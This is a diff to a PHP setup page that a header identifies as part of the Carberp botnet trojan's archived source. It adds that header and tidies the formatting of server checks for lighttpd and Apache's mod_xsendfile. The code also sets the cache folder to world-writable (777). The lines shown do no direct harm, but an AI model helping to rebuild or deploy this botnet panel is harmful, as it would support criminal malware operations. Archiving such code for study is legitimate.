@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 "<?php echo $lang['cs']; ?>"
 <br /><br />
 <?php
@@ -21,12 +32,14 @@ WebServer - <?php echo $lang['module']; ?> mod_xsendfile:
 
 if(!is_writable('cache/')) @chmod('cache/', '777');
 
-if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){	echo $lang['in'];
+if(preg_match('~lighttpd~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
+	echo $lang['in'];
 }elseif(preg_match('~apache~', strtolower($_SERVER['SERVER_SOFTWARE'])) == true){
 	$am = apache_get_modules();
 	if($am[array_search('mod_xsendfile', $am)] == 'mod_xsendfile'){
 		echo $lang['in'];
-	}else{		echo ' <span style="color:red">'.$lang['ni'].'</span>';
+	}else{
+		echo ' <span style="color:red">'.$lang['ni'].'</span>';
 	}
 }
 
